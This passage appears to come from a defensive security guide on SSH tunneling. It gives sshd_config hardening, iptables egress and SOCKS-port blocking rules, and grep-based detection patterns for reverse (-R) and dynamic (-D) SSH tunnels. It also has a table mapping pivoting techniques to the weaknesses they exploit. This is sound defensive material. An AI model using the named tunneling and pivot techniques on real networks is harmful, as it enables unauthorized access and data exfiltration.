            print(report)
            if args.output:
                args.output.write_text(report)

    elif args.cmd == "watch":
        watch_mode(args.interval)


if __name__ == "__main__":
    main()
```

---

## 8. Defense Configuration

### sshd_config Hardening

```bash
# /etc/ssh/sshd_config

# Disable tunneling capabilities
AllowTcpForwarding no          # Block all TCP forwarding
GatewayPorts no                # Block external access to forwarded ports
PermitTunnel no                # Block TUN/TAP tunnels
X11Forwarding no               # Block X11 forwarding
AllowStreamLocalForwarding no  # Block Unix socket forwarding

# Allow forwarding only for specific authorized groups
Match Group sshforward
    AllowTcpForwarding yes

# General security hardening
PermitRootLogin no
PasswordAuthentication no      # Key-based auth only
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
LoginGraceTime 30

# Strong cipher suites only
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512

# Apply changes
systemctl restart sshd

# Verify configuration
sshd -T | grep -E "allowtcpforwarding|gatewayports|permittunnel"
```

### Firewall Rules

```bash
# Allow SSH only from authorized source IPs
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Log and block outgoing SSH from non-sshd processes (anomaly detection)
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd \
    -j LOG --log-prefix "SSH-ANOMALY-OUT: "
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j DROP

# Block common SOCKS proxy ports
iptables -A INPUT -p tcp --dport 1080 -j LOG --log-prefix "SOCKS-PROXY: "
iptables -A INPUT -p tcp --dport 1080 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

### Detection Summary

| Detection Target | Method | Risk Level |
|-----------------|--------|------------|
| SSH process with `-R` flag | `ps aux \| grep "ssh.*-R"` | High |
| SSH process with `-D` flag | `ps aux \| grep "ssh.*-D"` | High |
| SSH listening on unusual port | `ss -tlnp \| grep ssh` | Medium |
| Long-duration SSH connection | Log analysis | Medium |
| SSH from unauthorized IP | Firewall logs | Low–High |
| Abnormal SSH traffic volume | NetFlow analysis | Medium |

<!-- detect-validate-24 -->
## SSH Tunneling and Pivot Detection and Defense Validation

SSH tunneling becomes a path for pivoting, bypass, and exfiltration via *forwarding allowance, uncontrolled egress, and persistent tunnels*. Defenders must verify **whether unauthorized tunnels/pivots are detected on their own hosts**. Validate only on **owned hosts**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| Local/remote forwarding | Forwarding allowed | AllowTcpForwarding no | Abnormal forwarding session |
| Dynamic (SOCKS) proxy | Uncontrolled egress | Egress filter, force proxy | Single SSH, many destinations |
| Reverse tunnel | Outbound trust | Restrict outbound SSH | Internal->external port 22 |
| ProxyJump pivot | Flat network | Segmentation, jump host | Chained SSH hops |

### Defense validation (verify directly)

```bash
# 1) Check forwarding allowance on your own host (owned host) — "yes" opens a tunnel path
sshd -T 2>/dev/null | grep -E "allowtcpforwarding|permittunnel|gatewayports"
# 2) Detect destination spread of active SSH sessions — pivot/multi-destination signal
ss -tnp 2>/dev/null | grep -E ':22 ' | awk '{print $5}' | sort | uniq -c | sort -rn | head
```

> SSH-tunnel defense is *whether unauthorized paths are visible* -- "we use SSH" differs from "forwarding is off and reverse tunnels are caught at egress". Confirm sshd_config and active sessions on owned hosts directly ([[17_Red_Team_Operations]], [[55_Evasion_Techniques]], [[13_SOC_Blue_Team]]).
